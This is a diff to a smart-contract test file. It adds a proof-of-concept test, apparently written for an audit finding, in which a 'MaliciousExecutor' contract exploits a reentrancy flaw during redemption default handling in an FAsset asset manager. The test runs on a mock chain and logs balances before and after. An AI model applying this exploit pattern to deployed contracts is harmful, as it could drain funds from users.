@@ -1,7 +1,7 @@
 import { expectRevert } from "@openzeppelin/test-helpers";
 import { TX_BLOCKED, TX_FAILED } from "../../../lib/underlying-chain/interfaces/IBlockChain";
 import { eventArgs, requiredEventArgs } from "../../../lib/utils/events/truffle";
-import { DAYS, MAX_BIPS, toBN, toWei } from "../../../lib/utils/helpers";
+import { DAYS, MAX_BIPS, toBN, toBNExp, toWei } from "../../../lib/utils/helpers";
 import { assertApproximatelyEqual } from "../../utils/approximation";
 import { MockChain } from "../../utils/fasset/MockChain";
 import { MockFlareDataConnectorClient } from "../../utils/fasset/MockFlareDataConnectorClient";
@@ -13,6 +13,7 @@ import { CommonContext } from "../utils/CommonContext";
 import { Minter } from "../utils/Minter";
 import { Redeemer } from "../utils/Redeemer";
 import { testChainInfo } from "../utils/TestChainInfo";
+
 
 contract(`AssetManager.sol; ${getTestFile(__filename)}; Asset manager simulations`, async accounts => {
     const governance = accounts[10];
@@ -156,6 +157,78 @@ contract(`AssetManager.sol; ${getTestFile(__filename)}; Asset manager simulation
             assertWeb3Equal(startPoolBalanceAgent.sub(endPoolBalanceAgent), res.redeemedPoolCollateralWei);
             // agent can exit now
             await agent.exitAndDestroy(fullAgentCollateral.sub(res.redeemedVaultCollateralWei));
+        });
+
+        it.only("nnez-default-reentrancy", async () => {
+            // Create all essential actors
+            const agent = await Agent.createTest(context, agentOwner1, underlyingAgent1);
+            const minter = await Minter.createTest(context, minterAddress1, underlyingMinter1, context.underlyingAmount(10000));
+            const redeemer = await Redeemer.create(context, redeemerAddress1, underlyingRedeemer1);
+            const redeemer2 = await Redeemer.create(context, redeemerAddress2, underlyingRedeemer2);
+
+            // Make agent available with collateral
+            const fullAgentCollateral = toWei(6e8);
+            await agent.depositCollateralsAndMakeAvailable(fullAgentCollateral, fullAgentCollateral);
+            // update block
+            await context.updateUnderlyingBlock();
+
+            // Perform minting for redeemer1 and redeemer2
+            const lots = 3;
+            const crt = await minter.reserveCollateral(agent.vaultAddress, lots);
+            const txHash = await minter.performMintingPayment(crt);
+            const minted = await minter.executeMinting(crt, txHash);
+            await context.fAsset.transfer(redeemer.address, minted.mintedAmountUBA, { from: minter.address });
+            await context.updateUnderlyingBlock();
+
+            const crt2 = await minter.reserveCollateral(agent.vaultAddress, lots);
+            const txHash2 = await minter.performMintingPayment(crt2);
+            const minted2 = await minter.executeMinting(crt2, txHash2);
+            await context.fAsset.transfer(redeemer2.address, minted2.mintedAmountUBA, { from: minter.address });
+            await context.updateUnderlyingBlock();
+
+
+            // Deploy malicious executor contract
+            const executorFee = toBNExp(1, 9); // set at 1 gwei
+            const executorFactory = artifacts.require("MaliciousExecutor");
+            const executorInstance = await executorFactory.new(context.assetManager.address);
+            const executor = executorInstance.address;
+
+            // Make request for redemptions for both redeemer1 and redeemer2
+            const [redemptionRequests, remainingLots, dustChanges] = await redeemer.requestRedemption(lots, executor, executorFee);
+            await redeemer2.requestRedemption(lots, executor, executorFee);
+
+            const request = redemptionRequests[0];
+
+            // mine some blocks to create overflow block
+            for (let i = 0; i <= context.chainInfo.underlyingBlocksForPayment + 10; i++) {
+                await minter.wallet.addTransaction(minter.underlyingAddress, minter.underlyingAddress, 1, null);
+            }
+
+            // Generate proof of nonpayment for redeem request of redeemer1
+            const proof = await context.attestationProvider.proveReferencedPaymentNonexistence(
+                request.paymentAddress,
+                request.paymentReference,
+                request.valueUBA.sub(request.feeUBA),
+                request.firstUnderlyingBlock.toNumber(),
+                request.lastUnderlyingBlock.toNumber(),
+                request.lastUnderlyingTimestamp.toNumber());
+
+            let beforeBalance = await executorInstance.howMuchIsMyNativeBalance();
+            let vaultCollateralBalanceBefore = await agent.vaultCollateralToken().balanceOf(redeemerAddress1);
+
+            const res = await executorInstance.defaulting(proof, request.requestId, 1); // Change last parameter to zero for non-exploit
+
+            let afterBalance = await executorInstance.howMuchIsMyNativeBalance();
+            let vaultCollateralBalanceAfter = await agent.vaultCollateralToken().balanceOf(redeemerAddress1);
+
+            console.log("Executor's native balance (executor fee)");
+            console.log("before: ", beforeBalance.toString());
+            console.log("after: ", afterBalance.toString());
+            console.log("----------");
+
+            console.log("Redeemer1's vault collateral balance");
+            console.log("before: ", vaultCollateralBalanceBefore.toString());
+            console.log("after: ", vaultCollateralBalanceAfter.toString());
         });
 
         it("mint and redeem defaults (agent) - no underlying payment, vault CR too low, pool must pay extra", async () => {
